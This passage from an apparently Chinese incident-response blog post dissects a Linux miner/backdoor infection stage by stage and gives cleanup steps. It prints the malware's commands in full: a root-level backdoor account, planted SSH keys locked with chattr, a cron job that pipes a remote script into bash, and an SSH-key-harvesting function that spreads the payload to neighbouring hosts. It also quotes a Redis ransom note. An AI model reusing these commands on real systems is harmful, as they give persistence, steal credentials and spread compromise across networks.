class="header-anchor" href="#解决-7"><span>解决：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>rm -rf /etc/systemd/system/xmrig.service</span></span>
<span class="line"><span>systemctl status xmrig.service</span></span>
<span class="line"><span>systemctl disable xmrig.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_12-设置ssh登录" tabindex="-1"><a class="header-anchor" href="#_12-设置ssh登录"><span>12.设置ssh登录</span></a></h2><h3 id="恶意代码和解释-2" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-2"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#setup ssh</span></span>
<span class="line"><span></span></span>
<span class="line"><span>RSAKEY=&quot;ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX wolf@wolfs-MacBook-Pro.local&quot; # 参数做了处理</span></span>
<span class="line"><span></span></span>
<span class="line"><span>grep -q nobodymm /etc/passwd || chattr -ia /etc/passwd; </span></span>
<span class="line"><span>grep -q nobodymm /etc/passwd || echo &#39;nobodymm:x:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd; chattr +ia /etc/passwd</span></span>
<span class="line"><span>grep -q nobodymm /etc/shadow || chattr -ia /etc/shadow; </span></span>
<span class="line"><span>grep -q nobodymm /etc/shadow || echo &#39;nobodymm:XXXXXXXXX:19237:0:14600:14:::&#39; &gt;&gt; /etc/shadow; chattr +ia /etc/shadow</span></span>
<span class="line"><span>grep -q nobodymm /etc/sudoers || chattr -ia /etc/sudoers; </span></span>
<span class="line"><span>grep -q nobodymm /etc/sudoers || echo &#39;nobodymm  ALL=(ALL:ALL) ALL&#39; &gt;&gt; /etc/sudoers; chattr +i /etc/sudoers</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码旨在确保名为 nobodymm 的用户存在于系统中，并且在 /etc/passwd、/etc/shadow 和 /etc/sudoers 文件中进行了相应的修改和保护。这可能是一种尝试在系统中添加特定用户并修改权限的脚本片段，但代码片段本身不提供足够的上下文以完全理解其用途。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>mkdir /run/network/.ssh/ -p  </span></span>
<span class="line"><span>touch /run/network/.ssh/authorized_keys  </span></span>
<span class="line"><span>chmod 600 /run/network/.ssh/authorized_keys</span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || chattr -ia /run/network/.ssh/authorized_keys; </span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || echo $RSAKEY &gt; /run/network/.ssh/authorized_keys; chattr +ia /run/network/.ssh/authorized_keys; </span></span>
<span class="line"><span>mkdir /root/.ssh/ -p  </span></span>
<span class="line"><span>touch /root/.ssh/authorized_keys  </span></span>
<span class="line"><span>chmod 600 /root/.ssh/authorized_keys</span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys; </span></span>
<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || echo $RSAKEY &gt;&gt; /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码旨在将一个特定的 SSH 公钥添加到系统中，以实现免密码登录。它在 /run/network/.ssh/authorized_keys 和 /root/.ssh/authorized_keys 文件中添加该公钥，并将这些文件设置为不可变属性，以防止进一步更改。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-1" tabindex="-1"><a class="header-anchor" href="#解决方法-1"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /etc/passwd</span></span>
<span class="line"><span>chattr -ia /etc/shadow</span></span>
<span class="line"><span>chmod 644  /etc/shadow</span></span>
<span class="line"><span>chattr -ia /etc/sudoers</span></span>
<span class="line"><span>再修改</span></span>
<span class="line"><span>vi /etc/passwd</span></span>
<span class="line"><span>删除：nobodymm:x:0:0:root:/root:/bin/bash</span></span>
<span class="line"><span></span></span>
<span class="line"><span>vi /etc/shadow</span></span>
<span class="line"><span>删除： nobodymm:XXXXXXXXX:19237:0:14600:14:::</span></span>
<span class="line"><span>chmod 000 /etc/shadow</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>chmod 644  /etc/sudoers</span></span>
<span class="line"><span>vi /etc/sudoers</span></span>
<span class="line"><span>删除： nobodymm  ALL=(ALL:ALL) ALL</span></span>
<span class="line"><span>chmod 440  /etc/sudoers</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span>rm -rf  /run/network</span></span>
<span class="line"><span>chattr -ia /root/.ssh/authorized_keys</span></span>
<span class="line"><span>vi /root/.ssh/authorized_keys;</span></span>
<span class="line"><span>删除密钥</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_13-修改-sshd-config-远程登录端口" tabindex="-1"><a class="header-anchor" href="#_13-修改-sshd-config-远程登录端口"><span>13.修改 sshd_config 远程登录端口</span></a></h2><h3 id="恶意代码和解释-3" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-3"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>grep -q 11222 /etc/ssh/sshd_config || echo &quot;Port 22&quot; &gt;&gt; /etc/ssh/sshd_config</span></span>
<span class="line"><span>grep -q 11222 /etc/ssh/sshd_config || echo &quot;Port 11222&quot; &gt;&gt; /etc/ssh/sshd_config</span></span>
<span class="line"><span>echo &quot;Protocol 2&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;ListenAddress 0.0.0.0&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>echo &quot;AuthorizedKeysFile  .ssh/authorized_keys&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
<span class="line"><span>sudo systemctl restart sshd </span></span>
<span class="line"><span>touch -d 20180409 /etc/ssh/sshd_config </span></span>
<span class="line"><span>chattr +ia /etc/ssh/sshd_config </span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于修改 SSH 服务器的配置文件，设置监听端口、协议版本、监听地址、身份验证等选项，并确保配置文件被修改时间锁定以及不可更改。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-2" tabindex="-1"><a class="header-anchor" href="#解决方法-2"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /etc/ssh/sshd_config</span></span>
<span class="line"><span>vi /etc/ssh/sshd_config </span></span>
<span class="line"><span>删除新增的字段</span></span>
<span class="line"><span>Port 22</span></span>
<span class="line"><span>Port 11222</span></span>
<span class="line"><span>Protocol 2</span></span>
<span class="line"><span>ListenAddress 0.0.0.0</span></span>
<span class="line"><span>RSAAuthentication yes</span></span>
<span class="line"><span>PubkeyAuthentication yes</span></span>
<span class="line"><span>AuthorizedKeysFile  .ssh/authorized_keys</span></span>
<span class="line"><span>都是删掉保存</span></span>
<span class="line"><span>systemctl restart sshd </span></span>
<span class="line"><span></span></span>
<span class="line"><span>已经在最开始的时候操作了</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_14-修改定时任务" tabindex="-1"><a class="header-anchor" href="#_14-修改定时任务"><span>14.修改定时任务</span></a></h2><h3 id="恶意代码和解释-4" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-4"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -R -ia /var/spool/cron </span></span>
<span class="line"><span>chattr -ia /etc/crontab </span></span>
<span class="line"><span>chattr -R -ia /etc/cron.d </span></span>
<span class="line"><span>chattr -R -ia /var/spool/cron/crontabs </span></span>
<span class="line"><span>crontab -r</span></span>
<span class="line"><span>rm -rf /var/spool/cron/*</span></span>
<span class="line"><span>rm -rf /etc/cron.d/*</span></span>
<span class="line"><span>rm -rf /var/spool/cron/crontabs</span></span>
<span class="line"><span>rm -rf /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>crontab -l 2&gt;/dev/null</span></span>
<span class="line"><span>echo &quot;*/30 * * * * root curl -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash &quot; &gt;&gt; /etc/crontab</span></span>
<span class="line"><span>echo &quot;*/30 * * * * root cd1 -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash &quot; &gt;&gt; /etc/crontab</span></span>
<span class="line"><span>echo crontab created</span></span>
<span class="line"><span>touch -d 20180515 /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chattr -R +ia /var/spool/cron</span></span>
<span class="line"><span>chattr +ia /etc/crontab</span></span>
<span class="line"><span>chattr -R +ia /var/spool/cron/crontabs</span></span>
<span class="line"><span>chattr -R +ia /etc/cron.d</span></span>
<span class="line"><span></span></span>
<span class="line"><span>touch -d 20151212 /etc/.system</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码旨在修改和设置定时任务的配置以及相关文件的属性</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-3" tabindex="-1"><a class="header-anchor" href="#解决方法-3"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /var/spool/cron</span></span>
<span class="line"><span>chattr -ia /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>vi /etc/crontab</span></span>
<span class="line"><span>rm -rf   /etc/crontab~</span></span>
<span class="line"><span>rm -rf /etc/crontaz~</span></span>
<span class="line"><span>systemctl restart crond</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_15-获取局域网ip-并且感染对应" tabindex="-1"><a class="header-anchor" href="#_15-获取局域网ip-并且感染对应"><span>15.获取局域网IP，并且感染对应</span></a></h2><h3 id="恶意代码和解释-5" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-5"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>localgo() {</span></span>
<span class="line"><span>    KEYS=$(find ~/ /root /home -maxdepth 2 -name &#39;id_rsa*&#39; | grep -vw pub)</span></span>
<span class="line"><span>    # KEYS：使用 find 命令搜索用户目录下的 id_rsa 私钥文件，排除 .pub 后缀的公钥文件。</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F &quot;IdentityFile&quot; &#39;{print $2 }&#39;)</span></span>
<span class="line"><span>    # KEYS2：从 SSH 配置文件中提取 IdentityFile 的路径。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    KEYS3=$(find ~/ /root /home -maxdepth 3 -name &#39;*.pem&#39; | uniq)</span></span>
<span class="line"><span>    #KEYS3：使用 find 命令搜索用户目录下的 .pem 文件。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>    HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F &quot;HostName&quot; &#39;{print $2}&#39;)</span></span>
<span class="line"><span>    #HOSTS：从 SSH 配置文件中提取 HostName。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot;(ssh|scp)&quot; | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot;)</span></span>
<span class="line"><span>    #HOSTS2：从用户的命令历史中提取出使用 SSH 或 SCP 连接过的 IP 地址。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>    HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot; | uniq)</span></span>
<span class="line"><span>    # HOSTS3：从已知主机的 SSH 密钥文件中提取出 IP 地址。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    USERZ=$(</span></span>
<span class="line"><span>        echo &quot;root&quot;</span></span>
<span class="line"><span>        find ~/ /root /home -maxdepth 2 -name &#39;\.ssh&#39; | uniq | xargs find | awk &#39;/id_rsa/&#39; | awk -F&#39;/&#39; &#39;{print $3}&#39; | uniq | grep -v &quot;\.ssh&quot;</span></span>
<span class="line"><span>        # USERZ：从目录结构中提取用户列表，排除 .ssh 目录。</span></span>
<span class="line"><span>    )</span></span>
<span class="line"><span>    userlist=$(echo $USERZ | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    hostlist=$(echo &quot;$HOSTS $HOSTS2 $HOSTS3&quot; | grep -vw 127.0.0.1 | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>    keylist=$(echo &quot;$KEYS $KEYS2 $KEYS3&quot; | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    # userlist、hostlist、keylist：整理和排序上述提取出的用户、主机和密钥列表。</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    for user in $userlist; do</span></span>
<span class="line"><span>        for host in $hostlist; do</span></span>
<span class="line"><span>            for key in $keylist; do</span></span>
<span class="line"><span>                chmod +r $key; chmod 400 $key</span></span>
<span class="line"><span>                ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i $key $user@$host &quot;(curl -fsSL  http://XX.XX.XX.XX/php/php_8020.sh||cd1 -fsSL  http://XX.XX.XX.XX/php/php_8020.sh) | bash&quot;</span></span>
<span class="line"><span>            done</span></span>
<span class="line"><span>        done</span></span>
<span class="line"><span>    done</span></span>
<span class="line"><span></span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ ! -f &quot;/var/tmp/.alsp&quot; ];</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>  localgo</span></span>
<span class="line"><span>  echo &#39;lockfile&#39; &gt; /var/tmp/.alsp</span></span>
<span class="line"><span>  chattr +i /var/tmp/.alsp</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  echo &quot;replay .. i know this server ...&quot;</span></span>
<span class="line"><span>  exit</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Setup compXlete&quot;</span></span>
<span class="line"><span>curl ldfx58.XXXX.io</span></span>
<span class="line"><span>history -c</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码的目的是在远程主机上执行一段命令，通过 SSH 连接进行操作。在第一次执行时，它会执行 localgo 函数以搜索和连接主机，并在这些主机上执行一段远程命令。在执行完毕后，会创建一个锁文件 /var/tmp/.alsp 来防止再次执行。最后，输出一些信息并清除命令历史。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-4" tabindex="-1"><a class="header-anchor" href="#解决方法-4"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>获取变量</span></span>
<span class="line"><span>KEYS=$(find ~/ /root /home -maxdepth 2 -name &#39;id_rsa*&#39; | grep -vw pub)</span></span>
<span class="line"><span>KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F &quot;IdentityFile&quot; &#39;{print $2 }&#39;)</span></span>
<span class="line"><span>KEYS3=$(find ~/ /root /home -maxdepth 3 -name &#39;*.pem&#39; | uniq)</span></span>
<span class="line"><span>HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F &quot;HostName&quot; &#39;{print $2}&#39;)</span></span>
<span class="line"><span>HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot;(ssh|scp)&quot; | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot;)</span></span>
<span class="line"><span>HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot; | uniq)</span></span>
<span class="line"><span>USERZ=$(</span></span>
<span class="line"><span>        echo &quot;root&quot;</span></span>
<span class="line"><span>        find ~/ /root /home -maxdepth 2 -name &#39;\.ssh&#39; | uniq | xargs find | awk &#39;/id_rsa/&#39; | awk -F&#39;/&#39; &#39;{print $3}&#39; | uniq | grep -v &quot;\.ssh&quot;</span></span>
<span class="line"><span>    )</span></span>
<span class="line"><span>userlist=$(echo $USERZ | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>hostlist=$(echo &quot;$HOSTS $HOSTS2 $HOSTS3&quot; | grep -vw 127.0.0.1 | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
<span class="line"><span>keylist=$(echo &quot;$KEYS $KEYS2 $KEYS3&quot; | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)    </span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $KEYS</span></span>
<span class="line"><span>/root/.ssh/id_rsa /root/.ssh/id_rsa</span></span>
<span class="line"><span>echo $KEYS2</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $KEYS3</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $HOSTS</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $HOSTS2</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $HOSTS3</span></span>
<span class="line"><span>10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $USERZ</span></span>
<span class="line"><span>root www</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $userlist</span></span>
<span class="line"><span>root www</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $hostlist</span></span>
<span class="line"><span>10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo $keylist</span></span>
<span class="line"><span>/root/.ssh/id_rsa</span></span>
<span class="line"><span></span></span>
<span class="line"><span>ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i /root/.ssh/id_rsa root@172.30.149.186</span></span>
<span class="line"><span>报错：</span></span>
<span class="line"><span>ssh: connect to host 172.30.149.186 port 22: Connection refused</span></span>
<span class="line"><span>修改登录ssh端口，保护了局域网的其他主机</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chattr -i /var/tmp/.alsp</span></span>
<span class="line"><span>rm -rf /var/tmp/.alsp</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="安全防护" tabindex="-1"><a class="header-anchor" href="#安全防护"><span>安全防护</span></a></h1><p>查找原因，初步原因可能是redis，但是redis并没有暴露到公网。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span># netstat -tunpl|grep redis</span></span>
<span class="line"><span>tcp        0      0 172.30.149.182:63920    0.0.0.0:*               LISTEN      1054/redis-server 1 </span></span>
<span class="line"><span>tcp        0      0 127.0.0.1:63920         0.0.0.0:*               LISTEN      1054/redis-server 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>127.0.0.1:63920&gt; KEYS *</span></span>
<span class="line"><span>1) &quot;READ_ME_TO_RECOVER_DATA&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>127.0.0.1:63920&gt; get READ_ME_TO_RECOVER_DATA</span></span>
<span class="line"><span>&quot;We delete all databases, but download a copy to our server. The only way of recovery is you must send 0.01 BTC to XXXXXXXXXXXXXXXXX. You have until 48 hours to pay or data will be inaccessible. Once paid please email XXX@onionmail.com with code: `XXX` and we will recover your database. please read https://XXXXX.sh/XXXXXXXXXXXX for more information&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>妥妥的威胁！</span></span>
<span class="line"><span>127.0.0.1:63920&gt; del READ_ME_TO_RECOVER_DATA #删除 READ_ME_TO_RECOVER_DATA</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span># 关闭 redis</span></span>
<span class="line"><span>redis-cli -h 127.0.0.1 -p 63920 shutdown</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>访问留下来的链接</p><p><img src="https://imgoss.xgss.net/picgo/image-20230817162847974.png?aliyun" alt="image-20230817162847974"></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>There are different ways you can buy Bitcoin. You can pay with credit or debit card at these websites</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Moonpay - https://www.moonpay.com/buy/btc</span></span>
<span class="line"><span>Coinbase - https://www.coinbase.com/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>On this site you can use various methods such as apple Pay, gift card to buy Bitcoin</span></span>
<span class="line"><span>Paxful - https://paxful.com/buy-bitcoin</span></span>
<span class="line"><span>Agoradesk - https://agoradesk.com/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>If Bitcoin does not suit your needs, we can accept other cryptocurrencies. We cannot accept fiat, CRYPTO IS ONLY PAYMENT</span></span>
<span class="line"><span>Send the amount provided to the right address</span></span>
